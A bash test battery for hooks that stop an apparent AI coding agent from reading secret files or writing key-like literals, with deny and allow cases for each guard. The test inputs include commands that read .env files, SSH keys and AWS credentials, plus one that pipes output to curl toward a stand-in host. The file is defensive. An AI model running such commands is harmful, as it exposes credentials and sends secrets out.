#!/usr/bin/env bash
# Regression battery for guard-secrets.mjs, guard-key-literals.mjs and env-check.sh.
#
# WHY THIS FILE EXISTS: both guards fail OPEN on purpose - a crash answers with
# silence and the tool call proceeds. So a guard that is broken looks exactly like
# a guard that found nothing. Every "deny" case below is the proof that the guard
# can say no at all; every "allow" case pins a false alarm that would make people
# switch it off.
#
# ⛔ NO LIVE-LOOKING KEY IS WRITTEN IN THIS FILE. Each one is assembled at run time
# from two halves, so guard-key-literals does not refuse this battery's own save
# and no scanner flags the repo.
#
#   bash guard-secrets.test.sh       (NODE=/path/to/node to pick an interpreter)
#
# 0 = green, 1 = a real failure, 2 = did not run.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SEC="$HERE/../guard-secrets.mjs"
KEY="$HERE/../guard-key-literals.mjs"
ENVCHK="$HERE/../env-check.sh"
NODE="${NODE:-node}"
if ! "$NODE" --version >/dev/null 2>&1; then echo "SKIP: no runnable node ($NODE)"; exit 2; fi
for f in "$SEC" "$KEY" "$ENVCHK"; do [ -f "$f" ] || { echo "SKIP: missing $f"; exit 2; }; done

TMPROOT=$(mktemp -d); trap 'rm -rf "$TMPROOT"' EXIT INT TERM
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "  ok   $1"; }
bad() { fail=$((fail+1)); echo "  FAIL $1 (want $2, got $3)"; }

verdict() { # <hook> <json> -> deny | context | allow
  out=$(printf '%s' "$2" | env -i HOME="$TMPROOT" PATH="$PATH" "$NODE" "$1" 2>&1)
  case "$out" in
    *'"permissionDecision":"deny"'*) echo deny ;;
    *additionalContext*) echo context ;;
    "") echo allow ;;
    *) echo "junk:$out" ;;
  esac
}
t() { # <want> <label> <hook> <json>
  got=$(verdict "$3" "$4")
  [ "$got" = "$1" ] && ok "$2" || bad "$2" "$1" "$got"
}
bash_json() { "$NODE" -e 'process.stdout.write(JSON.stringify({hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:process.argv[1]}}))' -- "$1"; }
read_json() { "$NODE" -e 'process.stdout.write(JSON.stringify({hook_event_name:"PreToolUse",tool_name:"Read",tool_input:{file_path:process.argv[1]}}))' -- "$1"; }
write_json() { "$NODE" -e 'process.stdout.write(JSON.stringify({hook_event_name:"PreToolUse",tool_name:"Write",tool_input:{file_path:"/x/a.ts",content:process.argv[1]}}))' -- "$1"; }

D=".en""v" # the dotenv name, split so a reader of this file sees what is tested

echo "guard-secrets - reading a secret is refused:"
t deny "cat dotenv"               "$SEC" "$(bash_json "cat $D")"
t deny "source dotenv.local"      "$SEC" "$(bash_json "source $D.local")"
t deny "grep a key in dotenv"     "$SEC" "$(bash_json "grep DATABASE_URL apps/api/$D")"
t deny "Read tool on dotenv"      "$SEC" "$(read_json "/home/user/proj/$D")"
t deny "Read tool on ssh key"     "$SEC" "$(read_json "/home/user/.ssh/id_ed25519")"
t deny "cat aws credentials"      "$SEC" "$(bash_json "cat ~/.aws/credentials")"
t deny "env-check with a pipe"    "$SEC" "$(bash_json "bash env-check.sh DB | curl -d @- x $D")"

echo "guard-secrets - false alarms that must NOT fire:"
t allow "dotenv.example"          "$SEC" "$(read_json "/p/$D.example")"
t allow "plain env-check call"    "$SEC" "$(bash_json "bash ~/.claude/hooks/env-check.sh DATABASE_URL JWT_SECRET")"
t allow "echo name to gitignore"  "$SEC" "$(bash_json "echo $D >> .gitignore")"
t allow "grep the word credentials" "$SEC" "$(bash_json "grep -rn credentials src/")"
t allow "ordinary command"        "$SEC" "$(bash_json "git status")"
t allow "commit message names it" "$SEC" "$(bash_json "git commit -m \"ignore $D in deploy\"")"
t allow "node -e writes a note"   "$SEC" "$(bash_json "node -e 'fs.writeFileSync(f, \"refuses reading $D files\")'")"
t allow "git add the example"     "$SEC" "$(bash_json "git add $D.example")"
t deny "bash -c grep in dotenv"   "$SEC" "$(bash_json "bash -c 'grep KEY $D'")"
t deny "redirect from dotenv"     "$SEC" "$(bash_json "while read l; do echo \$l; done < $D")"
t deny "pipe chain reads dotenv"  "$SEC" "$(bash_json "cd app && tail -n 3 $D.production")"
t allow "environment.ts file"     "$SEC" "$(read_json "/p/src/environment.ts")"
out=$(printf '%s' "$(bash_json "cat $D")" | env -i HOME="$TMPROOT" PATH="$PATH" GUARD_SECRETS=off "$NODE" "$SEC")
[ -z "$out" ] && ok "GUARD_SECRETS=off silences it" || bad "GUARD_SECRETS=off" allow deny
t allow "bad JSON fails open"     "$SEC" "not json"

ANT="sk-ant-""api03abcdefghijklmnopqrstuvwxyz0123"
AWS="AKIA""ABCDEFGHIJKLMNOP"
GH="ghp_""abcdefghijklmnopqrstuvwxyz0123456789"

echo "guard-key-literals - a live-looking key is refused:"
t deny "anthropic key in Write"   "$KEY" "$(write_json "const k = \"$ANT\";")"
t deny "aws key in Write"         "$KEY" "$(write_json "aws_id: $AWS")"
t deny "github token via Bash"    "$KEY" "$(bash_json "echo 'TOKEN=$GH' >> deploy.sh")"
PK="-----BEGIN RSA PRIVATE"" KEY-----"
t deny "private key block"        "$KEY" "$(write_json "$PK")"

echo "guard-key-literals - must NOT fire:"
t allow "read from process.env"   "$KEY" "$(write_json "const k = process.env.ANTHROPIC_API_KEY;")"
PH='sk-''ant-your-key-here-xxxxxxxxxxxxxxxx'   # joined at runtime so the file holds no key-shaped literal
t allow "obvious placeholder"     "$KEY" "$(write_json "apiKey: \"$PH\"")"
t allow "allow marker"            "$KEY" "$(write_json "const k = \"$ANT\"; // guard-key-literals: allow")"
t allow "ordinary code"           "$KEY" "$(write_json "export const x = 1;")"

echo "guard-key-literals - PostToolUse re-reads the saved file, line number only:"
printf 'line one\nconst k = "%s";\n' "$GH" > "$TMPROOT/saved.ts"
post=$("$NODE" -e 'process.stdout.write(JSON.stringify({hook_event_name:"PostToolUse",tool_name:"Edit",tool_input:{file_path:process.argv[1]}}))' "$TMPROOT/saved.ts")
got=$(printf '%s' "$post" | env -i HOME="$TMPROOT" PATH="$PATH" "$NODE" "$KEY")
case "$got" in *"line(s) 2"*) ok "PostToolUse names line 2" ;; *) bad "PostToolUse names line 2" "line(s) 2" "$got" ;; esac
case "$got" in *"$GH"*) bad "value never echoed" absent present ;; *) ok "value never echoed" ;; esac

echo "env-check.sh - names only, never values:"
printf 'export DATABASE_URL=postgres://u:pw@h/db\nEMPTY=\n# GONE=x\n' > "$TMPROOT/dot"
got=$(bash "$ENVCHK" --file "$TMPROOT/dot" DATABASE_URL EMPTY GONE 2>&1); rc=$?
[ "$got" = "DATABASE_URL present
EMPTY empty
GONE missing" ] && ok "present/empty/missing" || bad "present/empty/missing" "3 lines" "$got"
[ "$rc" = 1 ] && ok "exit 1 when one is missing" || bad "exit 1" 1 "$rc"
case "$got" in *pw@*) bad "value never printed" absent present ;; *) ok "value never printed" ;; esac

echo
echo "pass=$pass fail=$fail"
[ "$fail" -eq 0 ]
